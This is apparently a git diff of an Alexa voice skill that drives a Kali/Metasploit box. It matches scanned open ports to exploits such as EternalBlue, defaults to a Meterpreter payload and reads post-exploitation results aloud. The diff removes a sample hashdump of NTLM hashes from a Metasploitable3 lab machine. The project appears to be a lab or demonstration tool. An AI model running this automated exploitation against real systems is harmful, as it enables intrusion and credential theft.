 	this.attributes.repromptSpeech = "To get status you can ask, how's the hack going.";  // don't say anything if we're just going to the next function in the state queue
-	this.emit(':ask', this.mstatus, "If you want to find out about how the hack is going, just say How's the hack going?");
-	console.log("<exploitres> check on hack!");
+	this.emit(':ask', this.attributes.mstatus, this.attributes.repromptSpeech);
+	console.log("<exploitres> tried to speak " + this.mstatus + " check on hack!");
 	// **** a test string to see if you can parse the returning shell info appropriately... if you make changes to the parser, you can use 
 	// **** the shackres string as a quick sanity check by calling this function from a test
 	//var shackres = "";
@@ -3357,27 +3444,35 @@ const handlers = {
 
 'SetLPortIntent': function () {
   // give me an exploit for port X
-  //this.attributes.lport = //
+  //if (!this.attributes.lport)  
+  this.emit(':ask', "Local port is " + this.attributes.lport, "If you want to find out about how the hack is going, just say, status update.");
 },
 
 'SetRPortIntent': function () {
   // give me an exploit for port X
   //this.emitWithState('ReadCommandFromKali');
+ this.emit(':ask', "Remote port is " + this.attributes.rport, "If you want to find out about how the hack is going, just say, status update.");
 },
 
 'SetLHostIntent': function () {
   // give me an exploit for port X
   //this.emitWithState('ReadCommandFromKali');
+ this.emit(':ask',"Local host is " + this.attributes.lhost, "If you want to find out about how the hack is going, just say, status update.");
+
 },
 
 'SetRHostIntent': function () {
   // give me an exploit for port X
   //this.emitWithState('ReadCommandFromKali');
+  this.emit(':ask',"Remote host is " + this.attributes.rhost, "If you want to find out about how the hack is going, just say, status update.");
+
 },
 
 'UsePayloadIntent': function () {
   // give me an exploit for port X
   //this.emitWithState('ReadCommandFromKali');
+  this.emit(':ask', "The default payload is Meterpreter.", "If you want to find out about how the hack is going, just say, status update.");
+
 },
 
 'UseShellCommandIntent': function () {
@@ -3416,23 +3511,20 @@ const handlers = {
 //'UseExploitIntent': function () { }
 
 'exploit': function () {
-	console.log(">>EXPLOIT<< THIS.EVENT = " + JSON.stringify(this.event));
+			console.log(">>EXPLOIT<< THIS.EVENT = " + JSON.stringify(this.event));
 	  console.log("Exploit matching function");
-  // Choose list of exploits for port X, Y, Z
- // if (this.attributes['rhost'] === '8000') {  this.attributes['exploit'] = 'windows\http_header\icecast:8000'; }
- //this.attributes['exploit']= 'crap\crap:10';
-//if (this.attributes['rhost'] === '445') { this.attributes['exploit'] = 'windows\smb\ms17_010_eternalblue:445'; }
-console.log("Open ports=" + this.attributes.openports + "  Exploit rhost is:" + this.attributes.rhost);
-const explDB = this.t('EXPLOITPORTS');
-console.log("JSON of explDB=" + JSON.stringify(explDB));
-var jend = Object.keys(explDB).length;
- console.log("Length of explDB = " + jend);
-console.log("exploitDB items=" + explDB);
-
+ 	 // Choose list of exploits for port X, Y, Z
+			//ex: if (this.attributes['rhost'] === '445') { this.attributes['exploit'] = 'windows\smb\ms17_010_eternalblue:445'; }
+			console.log("Open ports=" + this.attributes.openports + "  Exploit rhost is:" + this.attributes.rhost);
+			const explDB = this.t('EXPLOITPORTS');
+			//console.log("JSON of explDB=" + JSON.stringify(explDB));
+			var jend = Object.keys(explDB).length;
+		 console.log("Length of explDB = " + jend);
+			console.log("exploitDB items=" + explDB);
   var iend=0;
   var windows = false;  //Linux
   var openports = this.attributes.openports;
- for (var w in openports)
+	 for (var w in openports)
   	{
   	    if(openports[w].service.match(/Microsoft/i)) windows = true; //Windows
   	}
@@ -3452,11 +3544,8 @@ console.log("exploitDB items=" + explDB);
   	//console.log("Exploit matching with Fuzzy search");
   	console.log("Looping through open ports: " + poor); // JSON.stringify(poor));
   	// loop through the entire exploit json object to get all the matches possible
-  	//for (var j = 0; j < jend; j++)
   	for (var j in explDB)
   	{
-  	//	console.log("j=" + explDB[j]);
-  	//	console.log("->exploit port:" + explDB[j] + " poor =" + poor);
   		if (explDB[j] == poor) {
   			// then add to the new array holding exploits to try
   			console.log("DB port = " + explDB[j] + "=" + poor);
@@ -3465,16 +3554,14 @@ console.log("exploitDB items=" + explDB);
   			if (windows === true && (j.match(/windows/i) ))  // we don't want to match multi yet
   			{ 
   			    console.log("Windows matched");
-//UGH!
   			    var s = j.toString().replace(' ','_');
-  			    console.log("Exploit line (s) =" + s);
+  			    //console.log("Exploit line (s) =" + s);
   			    
-  			   //if (s.indexOf(words[0].toLowerCase()) > -1 ) {
   			   if ( fuzzysearch(words[0],s,4)) {	
   			   	console.log(words[0] + " matched");
   			   	// windows and port is the same and a word matches so it's at the start of the list as a most likely target
   			   	exploitarray = '{"exploit":"' + s + '","port":"' + poor + '"},' + exploitarray;
-  			    console.log("exploitarray =" + exploitarray);
+  			    //console.log("exploitarray =" + exploitarray);
   			   }
   			   // we made a match but didn't get a hit on the service name so add it to the end of the list
   			   else{ exploitarray = exploitarray + '{"exploit":"' + s + '","port":"' + poor + '"},'; }
@@ -3483,34 +3570,30 @@ console.log("exploitDB items=" + explDB);
   			//If not Linux or unix in the string YAY! but we don't want to match multi or other types yet
   			{   			   
   				console.log("Linux or unix matched");
-//UGH!
   			    var ls = j.toString().replace(' ','_');
-  			    console.log("Exploit line (j) =" + j);
+  			    //console.log("Exploit line (j) =" + j);
   			  // if (ls.indexOf(words[0].toLowerCase()) > -1 ) {
   			  if ( fuzzysearch(words[0],ls,4)) { 	
-  			   	console.log(words[0] + " matched");
+  			   	//console.log(words[0] + " matched");
   			   	// linux and port is the same and a word matches so it's at the start of the list as a most likely target
   			    exploitarray = '{"exploit":"' + ls + '","port":"' + poor + '"},' + exploitarray;
-  			    console.log("exploitarray =" + exploitarray);
+  			    //console.log("exploitarray =" + exploitarray);
   				}
   			   // we made a match but didn't get a hit on the service name so add it to the end of the list
   			   else{ exploitarray = exploitarray + '{"exploit":"' + ls + '","port":"' + poor + '"},'; }
   			} 
   		}
   	}
-  //	console.log("NewExploitArray = " + newexplarray);
+  
   }
-    if (exploitarray.substr(exploitarray.length-2,exploitarray.length)===", ") 
-    {	newexplarray = exploitarray.substr(0, exploitarray.length-2); // chop the trailing comma off
-    } 
-    else if (exploitarray.substr(exploitarray.length-1,exploitarray.length)===",")
+    var newexplarray = exploitarray.trimRight(); // chop the trailing comma off
+    if (exploitarray.substr(exploitarray.length-1,exploitarray.length)===",")
     {	newexplarray = exploitarray.substr(0, exploitarray.length-1); // chop the trailing comma off
     } 
-    else {var newexplarray = exploitarray;} 
   	newexplarray = "[" + newexplarray + "]";
   console.log("Fuzzy Exploit array= " + JSON.stringify(newexplarray));  
   console.log("----Exploit array= " + JSON.stringify(newexplarray));
-  
+  this.attributes['repromptSpeech']=" ";   //// ** ADDED 5/7/19 ** ~~ to fix the empty field in the session save
   // set the global state vars and push the state to Kali
   this.attributes['attribname'] = "exploit";
   console.log ('Setting state machine to exploit');
@@ -3559,8 +3642,10 @@ console.log("exploitDB items=" + explDB);
 	if (!this.attributes['pollKaliCount']) this.attributes['pollKaliCount'] = 0; else this.attributes['pollKaliCount']++; 
 
 	if(this.attributes['pollKaliCount'] < 3) {
-		console.log("About to PlaySomethingFun and then ReadCommandFromKali");
+		//console.log("About to PlaySomethingFun and then ReadCommandFromKali");
 	//	this.emitWithState('PlaySomethingFun'); //delay a bit
+	//*** NEW NEW NEW next line only NEW NEW NEW
+	this.attributes['pollKaliCount'] = this.attributes['pollKaliCount'] + 1;
 			console.log("About to ReadCommandFromKali, pollKaliCount is:" +this.attributes['pollKaliCount']  );
 		this.emitWithState ('ReadCommandFromKali'); // try to poll Kali for a response again
 		// if the ReadCommandFromKali was successful, it should have parsed it into a new state machine state and trigger the next stage of the process
@@ -3583,43 +3668,43 @@ console.log("exploitDB items=" + explDB);
 		// call the function with the callback
 	var	me = this;
 	getWebPage(callbackGetWebPage,me); 
-//! comment this out after test	-------------------- snip ---------------------
-		//	var test = '{"responsetype": "exploitres", "openports": [], "portscanres": "", "exploitres": "...got system via technique 1 Named Pipe Impersonation In Memory Admin . Obtaining the boot key... Calculating the hboot key using SYSKEY 4fe4ffce3ea2a8d145014ca797aeaf89... Obtaining the user list and keys... Decrypting user keys... Dumping password hints...No users with password hints on this system Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::sshd server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::leah organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::luke skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::han solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::artoo detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::c three pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::ben kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::darth vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::anakin skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::jarjar binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::lando calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::boba fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::jabba hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::kylo ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::", "searchres": "", "usepayloadres": "", "shellres": "", "getuidres": "Server username: METASPLOITABLE3 slash vagrant", "windows": "True", "exploit": "", "rhost": "192.168.1.56", "lhost": "192.168.137.197", "payload": "", "rport": "8000", "lport": "4000", "exploits": "", "sessions": "1", "postmodule": "hashdump", "error": "Success", "mstatus": "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."}|sig=sig=somesignature';
-        //	 var tbody = test.split("|");
-        //	 var news = tbody[0];
-  		//	var nnews = news.replace("\\", " slash ");  // fix any single back-slashes that would appear in a file or domain so it doesn't mess up JSON
-      
-        //	 console.log("!!! Payload= " + nnews); // use just the signature part
-        //	 var parsed = JSON.parse(nnews);
-		//	 callbackGetWebPage(parsed,me);
-// end comment th is out after test ------------ end snip ---------------------
-		//end function
+
 		
-	function getWebPage(callback,me) {
+	function getWebPage(fncallback,me) {
+					console.log("inside getWebPage function");
     	return https.get({
         	host: process.env.SecretURL,
-    	    path: "/" + process.env.AlexaReadQueuePage
-	 }, function(response) {
+ 								path: "/" + process.env.AlexaReadQueuePage
+								}, function(response) {
     	    // Continuously update stream with data
-    	    var body = '';
+    	    var body = "";
     	  response.on('data', function(d) {
             body += d;
-    	    });
+            console.log("RCFKbody=" + body);
+    	   });
     	 response.on('end', function() {
-        	 if(body != ""){
-        	 body = body.split("|");
-        	 console.log("Payload= " + body[0]); // use just the signature part
-        	 body[0] = body[0].replace(/\\/g, " slash ");  // fix any single back-slashes that would appear in a file or domain so it doesn't mess up JSON
-        	 var parsed = JSON.parse(body[0].toString());
-        	 console.log("Parsed body body = "+parsed.toString()+"\n\r\-->");
+    	 				console.log("body=>" + body +"<");
+        	 if(body != "")
+        	 {
+        	 			body = body.split("|");
+        	 			console.log("Payload= " + body[0]); // use just the signature part
+        	 			body[0] = body[0].replace(/\\/g, " slash ");  // fix any single back-slashes that would appear in a file or domain so it doesn't mess up JSON
+        	 			var parsed = JSON.parse(body[0].toString());
+        	 			console.log("Parsed body body = "+parsed.toString()+"\n\r\-->");
         	    //var parsed = JSON.parse(body);
-    	     callback(parsed,me);
+    	     			fncallback(parsed,me);
         	 }
-        	 else {
-        	 	console.log ("No queued messages from Kali");
-        	 	me.attributes['responsetype'] == "noresponse";
-        	 	me.emit(":ask","I don't have an update from Kali yet.", "In the mean time would you like me to answer something else or maybe Rick roll someone?");
-				console.log(me.attributes['mstatus']);
+        	 else 
+        	 {
+        	// 	console.log ("No queued messages from Kali");
+        	// 	me.attributes['responsetype'] == "noresponse";
+        	// 	me.emit(":ask","I don't have an update from Kali yet.", "In the mean time would you like me to answer something else or maybe Rick roll someone?");
+											// ***** NEW NEW NEW IF THIS CAUSES PROBLEMS REMOVE IT NEW NEW NEW *****
+											me.attributes['mstatus'] == "No data yet";
+											console.log("mstatus=" + me.attributes['mstatus']);
+											var dat = JSON.parse('{"responsetype" : "0", "mstatus" : "No data yet", "rport" : "0", "openports" : "0"}');
+											fncallback(dat,me);
+											// ***** NEW NEW NEW end new NEW NEW NEW
         	 } 
         	 
     	 });
@@ -3627,60 +3712,82 @@ console.log("exploitDB items=" + explDB);
 	}
 	// do the synchronous work we need done before we get our stack jacked by Node
 	function callbackGetWebPage(databack,me) { 
-	  console.log("callback reached with databack=" + databack); 
+	  console.log("callbackGetWebPage reached with databack=" + databack); 
 	  //console.log(databack['rhost']);
 					// set the variables in the session
-					me.attributes['responsetype'] = databack['responsetype'] || "0";
-					me.attributes['rhost'] = databack['rhost'] || "0";
-	          		me.attributes['windows'] = databack['windows'] || "0";
-        			me.attributes['exploit'] = databack['exploit'] || "0";
-        			me.attributes['lhost'] = databack['lhost'] || "0";
-        			me.attributes['payload'] = databack['payload'] || "0";
-        			console.log("DATABACK-RPORT=>" + databack['rport'] + "<");
-        			if (databack['rport']) me.attributes['rport'] = databack['rport'] || "0";
-        			if (databack['lport']) me.attributes['lport'] = databack['lport'] || "0";
-        			me.attributes['sessions'] = databack['sessions'] || "0";
-        			me.attributes['postmodule'] = databack['postmodule'] || "0";
-        			me.attributes['error'] = databack['error'] || "0";
-        			me.attributes['mstatus'] = databack['mstatus'] || "0";
-        			me.attributes['openports'] = databack['openports'] || "0";
-        			me.attributes['portscanres'] = databack['portscanres'] || "0";
-        			me.attributes['exploitres'] = databack['exploitres'] || "0";
-        			
-        		//	me.attributes['openports'] = me.attributes['openports']; // it will either be '0' or an array of ports
-        			
-        			if (me.attributes.openports.length > 0) console.log("open ports from session = " + me.attributes.openports[1].service);
-        			console.log("tempResponse.openports = " + JSON.stringify( databack["openports"]));
-					console.log('Session rhost = ' + me.attributes['rhost']);
-					console.log('Session rport = ' + me.attributes['rport']);
-					console.log('Session lhost = ' + me.attributes['lhost']);
-					console.log('Session lport = ' + me.attributes['lport']);
-					console.log('Session rhost = ' + me.attributes['rhost']);
-					console.log('Session portscanres = ' + me.attributes['portscanres']);
-					console.log('Session openports = ' + me.attributes['openports']);
-					console.log('Session windows = ' +	me.attributes['windows']); 
-        			console.log('Session exploit = ' + me.attributes['exploit']); // this will end up being multiple exploits in a split string | delimited
-        			console.log('Session exploitres =' + me.attributes['exploitres']);
-        			console.log('Session payload = ' + me.attributes['payload']);
-        			console.log('Session sessions = ' + me.attributes['sessions']);
-        			console.log('Session postmodule = ' + me.attributes['postmodule']);
-        			console.log('Session mstatus = ' + me.attributes['mstatus']);
-        			// TODO: change the intent name of this next call to whatever we settle on for the startexploiting call
-        console.log("RCFK Responsetype is :" + me.attributes['responsetype'] + " about to emit exploit event with Me copy of session");
+							me.attributes['responsetype'] = databack['responsetype'] || "0";
+							me.attributes['rhost'] = databack['rhost'] || "0";
+							me.attributes['windows'] = databack['windows'] || "0";
+       me.attributes['exploit'] = databack['exploit'] || "0";
+       me.attributes['lhost'] = databack['lhost'] || "0";
+       me.attributes['payload'] = databack['payload'] || "0";
+       if (databack['rport']) me.attributes['rport'] = databack['rport'] || "0";
+              console.log("DATABACK-RPORT=>" + databack['rport'] + "<");
+       if (databack['lport']) me.attributes['lport'] = databack['lport'] || "0";
+       me.attributes['sessions'] = databack['sessions'] || "0";
+       me.attributes['postmodule'] = databack['postmodule'] || "0";
+       me.attributes['error'] = databack['error'] || "0";
+       me.attributes['mstatus'] = databack['mstatus'] || "0";
+       me.attributes['openports'] = databack['openports'] || "0";
+       me.attributes['portscanres'] = databack['portscanres'] || "0";
+       me.attributes['exploitres'] = databack['exploitres'] || "0";
+       
+       // NEW NEW NEW this line only NEW NEW new 			
+       var portsready = false;
+       //	me.attributes['openports'] = me.attributes['openports']; // it will either be '0' or an array of ports
+        			// NEW NEW NEW NEW try to fix error writing data
+       if (me.attributes.openports.length > 0) { 
+       	try { console.log("Open ports from session = " + me.attributes.openports[1].service); portsready = true;
+       	} catch(errr) { console.log("Open ports from session is empty"); }}
+       	// NEW NEW NEW try to fix error writing to conole for empty data
+       try {console.log("tempResponse.openports = " + JSON.stringify( databack["openports"]));} catch(er){console.log("no open ports");}
+       
+							console.log('Session rhost = ' + me.attributes['rhost']);
+							console.log('Session rport = ' + me.attributes['rport']);
+							console.log('Session lhost = ' + me.attributes['lhost']);
+							console.log('Session lport = ' + me.attributes['lport']);
+							console.log('Session rhost = ' + me.attributes['rhost']);
+							console.log('Session portscanres = ' + me.attributes['portscanres']);
+							console.log('Session openports = ' + me.attributes['openports']);
+							console.log('Session windows = ' +	me.attributes['windows']); 
+       console.log('Session exploit = ' + me.attributes['exploit']); // this will end up being multiple exploits in a split string | delimited
+       console.log('Session exploitres =' + me.attributes['exploitres']);
+       console.log('Session payload = ' + me.attributes['payload']);
+       console.log('Session sessions = ' + me.attributes['sessions']);
+       console.log('Session postmodule = ' + me.attributes['postmodule']);
+       console.log('Session mstatus = ' + me.attributes['mstatus']);
+       // TODO: change the intent name of this next call to whatever we settle on for the startexploiting call
+       console.log("RCFK Responsetype is :" + me.attributes['responsetype'] + " about to emit exploit event with Me copy of session");
 		// MAKE SURE PROPER STATE IS SET for the next event
 		// Alexa sends Kali a "portscan" and Kali sends back the ports with the command "exploit"
-		if (me.attributes['responsetype'] == "portscan") me.emitWithState('exploit'); // we just got a port scan back so pick and send exploits to Kali
-		if (me.attributes['responsetype'] == "exploitres") //me.emitWithState('exploitres');
+		//if (me.attributes['responsetype'])
+		// ***** NEW NEW NEW changed to == 0 as well so if no response from Kali NEW NEW NEW 
+		console.log("me.attributes.mstatus = " + me.attributes['mstatus']);
+		console.log("databack.responsetype = " + databack['responsetype']);
+		if ( databack['responsetype'] == "portscan" || databack['responsetype'] == "0" )
+		{
+   	 if (databack['mstatus'] == "No data yet")
+					{ 
+						me.emit(":ask","I don't have an update from Kali yet.", "In the mean time would you like me to answer something else or maybe Rick roll someone?");
+					}			
+					if (portsready == true)
+					// NEW NEW NEW NEW changed to comment out line and closing brace NEW NEW NEW
+					{me.emit(":ask",me.attributes['mstatus'], "When you want to find out the status of the hack, just ask, how is the hack going?");
+					}
+		}
+		if (databack['responsetype'] == "portscan" && portsready == true) me.emitWithState('exploit'); // we just got a port scan back so pick and send exploits to Kali
+		if (databack['responsetype'] == "exploitres") 
+		//me.emitWithState('exploitres');
         {
         	var newres = me.attributes['exploitres'].replace("  ","");
-    		newres = newres.replace("username:", "username is");
-			newres = newres.replace( /:(.+?):::/g, " " );
-			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
-			newres = newres.replace('_',' ');
-			newres = newres.replace( /:(.+?):::/g, " " );
-			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
-			console.log("newres parsed postexploit is: " + newres);
-			me.emit(":ask",newres, "What what else can I do for you?");
+    					newres = newres.replace("username:", "username is");
+									newres = newres.replace( /:(.+?):::/g, " " );
+									newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
+									newres = newres.replace('_',' ');
+									newres = newres.replace( /:(.+?):::/g, " " );
+									newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
+									console.log("newres parsed postexploit is: " + newres);
+									me.emit(":ask",newres, "What what else can I do for you?");
 		}
         
         			console.log('Done ReadCommandFromKali callback');
@@ -3793,7 +3900,7 @@ const languageStrings = {
             WELCOME_MESSAGE1: "Entering Death Star hacker mode. As me about what service runs on port number, or ask me to hack a machine for you.",
             WELCOME_MESSAGE2: "I'm a Sith hacking army of one! Ask me about things like web headers and HTTP verbs or have me hack a box for you.",
             WELCOME_MESSAGE3: "Death Star A I at your service. If you want to hack a machine on IP address 192.168.1.34, say, hack eye pee address 1 dot 34",
-            WELCOME_MESSAGE4: "Hello, you've reached the Death Star. I can answer questions about encodings or hack something for you if you tell me the last two numbers of the IP address.",
+            WELCOME_MESSAGE4: "Hello, you've reached the Death Star. I can hack a machine in your subnet if you tell me the last two numbers of the IP address.",
             WELCOME_MESSAGE5: "Death Star is fully operational. I can look up IP addresses, hack something or even Rick roll someone.",
             WELCOME_MESSAGE6: "Sorry Emperor, I'll have to get back to you. Vader wants to fire the Death Star again.",
             
@@ -3806,42 +3913,40 @@ const languageStrings = {
             HELP_REPROMPT2: "Try to stump me with a good question.",
             HELP_MESSAGE3: "I know HTML encodings, hex encodings, ASCII encodings. I also know web headers and response codes. What can I help you with?",
             HELP_REPROMPT3: "Ask me something about hacking.",
-
-
             STOP_MESSAGE: "See ya!",
   
 			PORTS_REPEAT_MESSAGE: "Try saying repeat, or ask in a different way.",
             PORTS_NOT_FOUND_MESSAGE: "I didn't quite get that. ",
-            PORTS_NOT_FOUND_WITH_ITEM_NAME: "The requested port %s is not known",
+            PORTS_NOT_FOUND_WITH_ITEM_NAME: "Port %s is not in the database currently.",
             PORTS_NOT_FOUND_WITHOUT_ITEM_NAME: "The port number you asked for was not found",
             PORTS_NOT_FOUND_REPROMPT: "What other port can I help find?",
 			PORTS_DISPLAY_CARD_TITLE: "Port %s ",
 			
 			HTMLENCODING_REPEAT_MESSAGE: "If you want to hear that again, try saying repeat.",
-            HTMLENCODING_NOT_FOUND_MESSAGE: "I'm not quite sure what you're asking. ",
+            HTMLENCODING_NOT_FOUND_MESSAGE: "I'm not quite sure what you're asking.",
             HTMLENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the HTML encoding for %s ",
-            HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTML encoding ",
+            HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTML encoding.",
             HTMLENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
 			HTMLENCODING_DISPLAY_CARD_TITLE: "The HMTL Encoding for %s",
              
 			HEXENCODING_REPEAT_MESSAGE: "Let me know if I can help or repeat something for you.",
-            HEXENCODING_NOT_FOUND_MESSAGE: "I couldn't understand what you asked. ",
+            HEXENCODING_NOT_FOUND_MESSAGE: "I couldn't understand what you asked.",
             HEXENCODING_NOT_FOUND_WITH_ITEM_NAME: "the Hex encoding for %s ",
-            HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME: "I don't know that hex encoding ",
+            HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME: "I don't know that hex encoding.",
             HEXENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
 			HEXENCODING_DISPLAY_CARD_TITLE: "The Hex Encoding for %s",
 
 			ASCIIENCODING_REPEAT_MESSAGE: "To hear the answer again, try saying repeat.",
             ASCIIENCODING_NOT_FOUND_MESSAGE: "I didn't get what you were asking. ",
             ASCIIENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the ASCII encoding for %s ",
-            ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that ASCII encoding ",
+            ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that ASCII encoding.",
             ASCIIENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
 			ASCIIENCODING_DISPLAY_CARD_TITLE: "The ASCII Encoding for %s",
 
  			URLENCODING_REPEAT_MESSAGE: "To hear that encoding again, try saying repeat.",
             URLENCODING_NOT_FOUND_MESSAGE: "I didn't understand your question.",
             URLENCODING_NOT_FOUND_WITH_ITEM_NAME: "the URL encoding for %s ",
-            URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that URL encoding",
+            URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that URL encoding.",
             URLENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
 			URLENCODING_DISPLAY_CARD_TITLE: "The URL Encoding for %s",
 			
@@ -3859,7 +3964,7 @@ const languageStrings = {
             HTTPVERBS_NOT_FOUND_REPROMPT: "What else can I help with?",
 			HTTPVERBS_DISPLAY_CARD_TITLE: "The HTTP Verb %s",
 			
-			NMAP_REPEAT_MESSAGE: "To hear an n-map command again, just say repeat.",
+			NMAP_REPEAT_MESSAGE: "To hear the n-map syntax again, just say repeat.",
             NMAP_NOT_FOUND_MESSAGE: "Sorry, I have no idea what you just said. ",
             NMAP_NOT_FOUND_WITH_ITEM_NAME: "I couldn't find the NMAP command for %s. ",
             NMAP_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that NMAP scan type ",
@@ -3928,9 +4033,10 @@ const languageStrings = {
 };             
                
 exports.handler = (event, context, callback) => {
-    const alexa = Alexa.handler(event, context);
+    const alexa = Alexa.handler(event, context, callback);
     alexa.appId = APP_ID;
 console.log('Executed exports.handler');
+console.log("Exports Handler = " + JSON.stringify(this.event));
 	// store session crap in DynamoDB now that Lambda user has Role for read/write to Dynamo
 	alexa.dynamoDBTableName = 'KaliSessionData';
 //    console.log("APP_ID=" + APP_ID);
